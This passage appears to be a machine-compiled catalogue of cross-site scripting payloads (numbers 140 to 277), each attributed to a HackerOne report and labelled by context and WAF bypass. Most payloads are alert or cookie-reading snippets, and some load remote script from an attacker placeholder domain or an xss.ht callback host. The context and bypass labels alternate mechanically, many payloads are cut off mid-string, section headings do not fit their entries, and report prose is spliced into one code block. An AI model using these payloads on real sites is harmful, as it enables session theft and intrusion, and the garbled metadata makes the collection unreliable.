**Framework:** Framework-agnostic
**Source:** [Report #1167034](https://hackerone.com/reports/1167034)

#### Payload 140

```javascript
<script>alert(document.cookie);</script>
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1167230](https://hackerone.com/reports/1167230)

#### Payload 141

```javascript
">

<
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1167272](https://hackerone.com/reports/1167272)

#### Payload 142

```javascript
onmouseover="alert(document.cookie)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1168962](https://hackerone.com/reports/1168962)

#### Payload 143

```javascript
onerror=alert(...
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1171403](https://hackerone.com/reports/1171403)

#### Payload 144

```javascript
onerror=prompt(1337)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1173040](https://hackerone.com/reports/1173040)

#### Payload 145

```javascript
onerror=pr...
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1173593](https://hackerone.com/reports/1173593)

#### Payload 146

```javascript
<svg on onload=
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #118024](https://hackerone.com/reports/118024)

#### Payload 147

```javascript
onload=(alert)(document.domain)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1183336](https://hackerone.com/reports/1183336)

#### Payload 148

```javascript
onerror=%22javascript:alert(1)%22%3E
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1184379](https://hackerone.com/reports/1184379)

#### Payload 149

```javascript
Onerror=confirm`1`%20//%3E#`
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #118582](https://hackerone.com/reports/118582)

#### Payload 150

```javascript
confirm(1)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1187003](https://hackerone.com/reports/1187003)

#### Payload 151

```javascript
javaScript:alert(
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1187156](https://hackerone.com/reports/1187156)

#### Payload 152

```javascript
confirm(/-/g+this.ownerDocument.domain)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1187820](https://hackerone.com/reports/1187820)

#### Payload 153

```javascript
Document.domain
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1188643](https://hackerone.com/reports/1188643)

#### Payload 154

```javascript
onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1194254](https://hackerone.com/reports/1194254)

#### Payload 155

```javascript
onerror=javascript:alert(
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1194301](https://hackerone.com/reports/1194301)

#### Payload 156

```javascript
alert('hacked')
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1196253](https://hackerone.com/reports/1196253)

#### Payload 157

```javascript
onload=alert(document.domain)%3E.
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1196945](https://hackerone.com/reports/1196945)

#### Payload 158

```javascript
onload=alert(document.domain)&gt;
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1196958](https://hackerone.com/reports/1196958)

#### Payload 159

```javascript
ONLOAD=alert(0x000123)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1196989](https://hackerone.com/reports/1196989)

#### Payload 160

```javascript
alert(0x000123)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1198203](https://hackerone.com/reports/1198203)

#### Payload 161

```javascript
onerror=chor4o(9939)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1198517](https://hackerone.com/reports/1198517)

#### Payload 162

```javascript
onLoad=prompt(1)%3E
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1200770](https://hackerone.com/reports/1200770)

#### Payload 163

```javascript
prompt(9)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1201134](https://hackerone.com/reports/1201134)

#### Payload 164

```javascript
<svG onLoad=
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1206020](https://hackerone.com/reports/1206020)

#### Payload 165

```javascript
onLoad=prompt(9)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #120622](https://hackerone.com/reports/120622)

#### Payload 166

```javascript
<img src='x' onerror=
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #120683](https://hackerone.com/reports/120683)

#### Payload 167

```javascript
onload=alert(
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1207040](https://hackerone.com/reports/1207040)

## WAF Bypass Payloads

#### Payload 168

```javascript
<script src=https://x.com></script>
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1209098](https://hackerone.com/reports/1209098)

#### Payload 169

```javascript
%3CScRiPt%3E
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1210921](https://hackerone.com/reports/1210921)

#### Payload 170

```javascript
">
	<
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1211148](https://hackerone.com/reports/1211148)

#### Payload 171

```javascript
onload = function(){document.forms[
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1212067](https://hackerone.com/reports/1212067)

#### Payload 172

```javascript
'>
		<
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1212235](https://hackerone.com/reports/1212235)

#### Payload 173

```javascript
onerror=alert(9)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1212822](https://hackerone.com/reports/1212822)

#### Payload 174

```javascript
alert(9)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1216203](https://hackerone.com/reports/1216203)

#### Payload 175

```javascript
onload=alert(document.domain)%3E`
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1218173](https://hackerone.com/reports/1218173)

#### Payload 176

```javascript
onload=ale...
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1219002](https://hackerone.com/reports/1219002)

#### Payload 177

```javascript
<img src="http://url.to.file.which/not.exist" onerror=
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #121941](https://hackerone.com/reports/121941)

#### Payload 178

```javascript
alert("Hello!")
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1221942](https://hackerone.com/reports/1221942)

#### Payload 179

```javascript
onerror=confirm(3)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1223575](https://hackerone.com/reports/1223575)

#### Payload 180

```javascript
<IMG src=x onerror=
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1223577](https://hackerone.com/reports/1223577)

#### Payload 181

```javascript
onerror=prompt(1);
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1237321](https://hackerone.com/reports/1237321)

#### Payload 182

```javascript
alert(/xss!/)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1238528](https://hackerone.com/reports/1238528)

#### Payload 183

```javascript
onload=alert%28document.domain%29%3E?mimeType=text/html
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1241460](https://hackerone.com/reports/1241460)

#### Payload 184

```javascript
onload=alert%28document.cookie%29%3E?mimeType=text/html
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1243650](https://hackerone.com/reports/1243650)

#### Payload 185

```javascript
onload=alert%28
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1244053](https://hackerone.com/reports/1244053)

#### Payload 186

```javascript
onload=prompt(1)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1244145](https://hackerone.com/reports/1244145)

#### Payload 187

```javascript
alert('HackerOne MkSecurity Dom XSS')
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1244722](https://hackerone.com/reports/1244722)

#### Payload 188

```javascript
onmouseover="javascript:alert(
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1244731](https://hackerone.com/reports/1244731)

#### Payload 189

```javascript
onload=alert(0);
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1245048](https://hackerone.com/reports/1245048)

#### Payload 190

```javascript
prompt(%27XSS%27)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1245051](https://hackerone.com/reports/1245051)

#### Payload 191

```javascript
onload=confirm(document.domain)
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1245055](https://hackerone.com/reports/1245055)

#### Payload 192

```javascript
onclick=%27alert(document.domain)%27[url=]]xss[/url]
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #124578](https://hackerone.com/reports/124578)

#### Payload 193

```javascript
onclick='alert(document.domain)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1245787](https://hackerone.com/reports/1245787)

#### Payload 194

```javascript
prompt(90702)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1247833](https://hackerone.com/reports/1247833)

## Encoding & Obfuscation

#### Payload 195

```javascript
onmouseover='prompt(90702)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1250199](https://hackerone.com/reports/1250199)

#### Payload 196

```javascript
OnFocus=;1^(print)``^1
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1251868](https://hackerone.com/reports/1251868)

#### Payload 197

```javascript
<script>alert('xss');</script>
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1252020](https://hackerone.com/reports/1252020)

#### Payload 198

```javascript
onerror=confirm(9706)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1252059](https://hackerone.com/reports/1252059)

#### Payload 199

```javascript
confirm(9706)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1252155](https://hackerone.com/reports/1252155)

#### Payload 200

```javascript
<script>alert()</script>
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1252229](https://hackerone.com/reports/1252229)

#### Payload 201

```javascript
onerror="prompt(1)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1252282](https://hackerone.com/reports/1252282)

#### Payload 202

```javascript
<script>alert('test')</script>
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1253124](https://hackerone.com/reports/1253124)

#### Payload 203

```javascript
alert('test')
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1256496](https://hackerone.com/reports/1256496)

#### Payload 204

```javascript
javascript:prompt(
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1256777](https://hackerone.com/reports/1256777)

#### Payload 205

```javascript
<script>alert(205)</script>
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1257767](https://hackerone.com/reports/1257767)

#### Payload 206

```javascript
alert(205)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #125849](https://hackerone.com/reports/125849)

#### Payload 207

```javascript
onload=alert(2)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1260823](https://hackerone.com/reports/1260823)

#### Payload 208

```javascript
alert(2)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1260825](https://hackerone.com/reports/1260825)

#### Payload 209

```javascript
onerror=alert(document.domain);%3E
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1261148](https://hackerone.com/reports/1261148)

#### Payload 210

```javascript
<script>alert(0);</script>
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1264805](https://hackerone.com/reports/1264805)

#### Payload 211

```javascript
alert(100)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1264832](https://hackerone.com/reports/1264832)

#### Payload 212

```javascript
onload=prompt(1);
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1264834](https://hackerone.com/reports/1264834)

#### Payload 213

```javascript
onerror=alert(%27test%27);%3E
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1265390](https://hackerone.com/reports/1265390)

#### Payload 214

```javascript
alert(%27test%27)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1267380](https://hackerone.com/reports/1267380)

#### Payload 215

```javascript
onload=alert()
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1276742](https://hackerone.com/reports/1276742)

#### Payload 216

```javascript
onerror=document.body.innerHTML=location.hash
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1277383](https://hackerone.com/reports/1277383)

#### Payload 217

```javascript
alert("ismailtasdelen")
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1277389](https://hackerone.com/reports/1277389)

#### Payload 218

```javascript
<script src="http://<adversery_domain>/payload.js"></script>
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1277392](https://hackerone.com/reports/1277392)

#### Payload 219

```javascript
<script>let a = `<%= j '`+alert`' %>`</script>
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1280002](https://hackerone.com/reports/1280002)

#### Payload 220

```javascript
onerror=alert(document.cookie)%3E/4007861
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #129582](https://hackerone.com/reports/129582)

#### Payload 221

```javascript
onerror=alert(document.cookie)%3E/4007...
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1305472](https://hackerone.com/reports/1305472)

#### Payload 222

```javascript
alert("\<script\>alert(1)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1305477](https://hackerone.com/reports/1305477)

## Polyglot Payloads

#### Payload 223

```javascript
onerror=prompt(document.domain)%3E**
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #130591](https://hackerone.com/reports/130591)

#### Payload 224

```javascript
alert(document .domain)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1309237](https://hackerone.com/reports/1309237)

#### Payload 225

```javascript
onclick=alert(document
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1309385](https://hackerone.com/reports/1309385)

#### Payload 226

```javascript
onerror=alert(document.domain)%3E&date=...
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1309386](https://hackerone.com/reports/1309386)

#### Payload 227

```javascript
onerror=alert(document.domain)%3E&date=2019-07-21&no_bots=1
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1309949](https://hackerone.com/reports/1309949)

#### Payload 228

```javascript
onerror=alert(document.location)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1315898](https://hackerone.com/reports/1315898)

#### Payload 229

```javascript
<img src=x' and last name 
'onerror=
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1315907](https://hackerone.com/reports/1315907)

#### Payload 230

```javascript
onerror=alert(domain.domain)
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1317024](https://hackerone.com/reports/1317024)

#### Payload 231

```javascript
alert(domain.domain)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1317031](https://hackerone.com/reports/1317031)

#### Payload 232

```javascript
<details onauxclick=
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1321358](https://hackerone.com/reports/1321358)

#### Payload 233

```javascript
onauxclick=x=prompt,x`${document.cookie}`
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1321407](https://hackerone.com/reports/1321407)

#### Payload 234

```javascript
onauxclick=confirm(document.cookie)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1322104](https://hackerone.com/reports/1322104)

#### Payload 235

```javascript
confirm(document.cookie)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1326264](https://hackerone.com/reports/1326264)

#### Payload 236

```javascript
onauxclick=confirm`12233`
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1328546](https://hackerone.com/reports/1328546)

#### Payload 237

```javascript
<svg height="1000" width="1000" onauxclick=
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1331281](https://hackerone.com/reports/1331281)

#### Payload 238

```javascript
<script>alert('XSS')</script>
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1339034](https://hackerone.com/reports/1339034)

#### Payload 239

```javascript
<script>alert(document.domain);</script>
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1339356](https://hackerone.com/reports/1339356)

#### Payload 240

```javascript
alert("xElkomy")
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #134004](https://hackerone.com/reports/134004)

#### Payload 241

```javascript
onload=prompt(0)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1342009](https://hackerone.com/reports/1342009)

#### Payload 242

```javascript
onload=a...
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1343492](https://hackerone.com/reports/1343492)

#### Payload 243

```javascript
onload=alert(document.cookie)
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1350887](https://hackerone.com/reports/1350887)

#### Payload 244

```javascript
onerror=alert(1);
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1355537](https://hackerone.com/reports/1355537)

#### Payload 245

```javascript
%3CSCRIPT%3E
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1362995](https://hackerone.com/reports/1362995)

#### Payload 246

```javascript
"> 
<
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1363001](https://hackerone.com/reports/1363001)

#### Payload 247

```javascript
<script>document.pisarenko.submit();</script>
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1369674](https://hackerone.com/reports/1369674)

#### Payload 248

```javascript
<script>alert(test)</script>
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1370240](https://hackerone.com/reports/1370240)

#### Payload 249

```javascript
<script>alert(document.cookie))</script>
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1370746](https://hackerone.com/reports/1370746)

#### Payload 250

```javascript
alert(test)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1374017](https://hackerone.com/reports/1374017)

## Blind / Out-of-Band Payloads

#### Payload 251

```javascript
onload=alert(document.cookie);
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1376672](https://hackerone.com/reports/1376672)

#### Payload 252

```javascript
<img src="x" onload=
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1376961](https://hackerone.com/reports/1376961)

#### Payload 253

```javascript
alert ("XSS")
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1376990](https://hackerone.com/reports/1376990)

#### Payload 254

```javascript
<script> alert ("XSS") </script>
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1378413](https://hackerone.com/reports/1378413)

#### Payload 255

```javascript
<ScRipT x> alert ('XSS') </ ScRipT X> then the server... This report describes a XSS issue affecting the target application surface. The disclosed finding is titled "Reflected XSS and HTML..." and indicates exploitable input handling weaknesses. Observed report context: Summary: I found Xss and Html injection vulnerabilities on one of the DoD websites Description: When doing the Xss tests I used this payload: <script> alert ("XSS") </script>
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #137905](https://hackerone.com/reports/137905)

#### Payload 256

```javascript
alert ('XSS')
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #137906](https://hackerone.com/reports/137906)

#### Payload 257

```javascript
onerror="alert(document.co...
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1379158](https://hackerone.com/reports/1379158)

#### Payload 258

```javascript
onerror="alert(document.cookie)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1379400](https://hackerone.com/reports/1379400)

#### Payload 259

```javascript
alert (1)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #137964](https://hackerone.com/reports/137964)

#### Payload 260

```javascript
onerror = alert
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1388788](https://hackerone.com/reports/1388788)

#### Payload 261

```javascript
<img src = x onerror =
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1390131](https://hackerone.com/reports/1390131)

#### Payload 262

```javascript
onmouseover="confirm(document.domain)
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1392262](https://hackerone.com/reports/1392262)

#### Payload 263

```javascript
<iframe srcdoc="<img src=
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1392733](https://hackerone.com/reports/1392733)

#### Payload 264

```javascript
<script>$.getScript("//█████████.xss.ht")</script>
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1392935](https://hackerone.com/reports/1392935)

#### Payload 265

```javascript
onmouseover=alert%60%60%20...
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1394440](https://hackerone.com/reports/1394440)

#### Payload 266

```javascript
onmouseover=alert%60%60%20%22))/████████/█████.aspx
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1397940](https://hackerone.com/reports/1397940)

#### Payload 267

```javascript
alert(prompt('XSS BY ZEROX4')
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1398285](https://hackerone.com/reports/1398285)

#### Payload 268

```javascript
prompt('XSS BY ZEROX4')
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1398305](https://hackerone.com/reports/1398305)

#### Payload 269

```javascript
<script>alert(prompt('XSS BY ZEROX4'))</script>
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1398374](https://hackerone.com/reports/1398374)

#### Payload 270

```javascript
alert(window.parent.location)
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1400357](https://hackerone.com/reports/1400357)

#### Payload 271

```javascript
onerror=alert(window.parent.location)
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1404770](https://hackerone.com/reports/1404770)

#### Payload 272

```javascript
alert("xss by nagli")
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1404804](https://hackerone.com/reports/1404804)

#### Payload 273

```javascript
<script>alert("xss by nagli")</script>
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1410459](https://hackerone.com/reports/1410459)

#### Payload 274

```javascript
<script/src=/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1416672](https://hackerone.com/reports/1416672)

#### Payload 275

```javascript
<iframe/srcdoc='<script/src=
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1420529](https://hackerone.com/reports/1420529)

#### Payload 276

```javascript
<script src="https://fast.wistia.com/assets/external/E-v1.js" async=""></script>
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #142078](https://hackerone.com/reports/142078)

## Chained Payloads

#### Payload 277

```javascript
<script
  src="https://fast.wistia.com/embed/medias/t306dw04gl.jsonp"
  async=""
></script>
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #142135](https://hackerone.com/reports/142135)


